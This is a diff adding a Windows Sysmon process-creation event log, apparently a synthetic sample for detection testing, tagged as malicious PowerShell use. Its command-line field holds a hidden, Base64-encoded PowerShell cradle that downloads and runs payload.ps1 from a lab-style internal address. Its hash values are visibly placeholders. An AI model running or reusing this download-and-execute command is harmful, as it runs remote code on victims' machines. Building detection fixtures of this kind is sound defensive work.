@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+   <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-12-02T09:14:27.1122340Z" />
+      <EventRecordID>5103</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="4028" ThreadID="5188" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>fin-ws07.condef.local</Computer>
+      <Security UserID="S-1-5-18" />
+   </System>
+   <EventData>
+      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+      <Data Name="UtcTime">2024-12-02 09:14:27.108</Data>
+      <Data Name="ProcessGuid">{f3565dc0-8b13-674c-8102-000000000c00}</Data>
+      <Data Name="ProcessId">7712</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft® Windows® Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4ANQAuADcALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==</Data>
+      <Data Name="CurrentDirectory">C:\Users\jsmith\Downloads\</Data>
+      <Data Name="User">CONDEF\jsmith</Data>
+      <Data Name="LogonGuid">{f3565dc0-9012-674c-2f01-160000000000}</Data>
+      <Data Name="LogonId">0x1602f2</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=A1B2C3D4E5F607182930415263748596A7B8C9D,MD5=1A2B3C4D5E6F708192A3B4C5D6E7F809,SHA256=9F8E7D6C5B4A392817263544536271809F1E2D3C4B5A69788796A5B4C3D2E1F,IMPHASH=B2C1A0908F7E6D5C4B3A29180706F5E4</Data>
+      <Data Name="ParentProcessGuid">{f3565dc0-8b10-674c-7f01-000000000c00}</Data>
+      <Data Name="ParentProcessId">3344</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+      <Data Name="ParentUser">CONDEF\jsmith</Data>
+   </EventData>
+</Event>
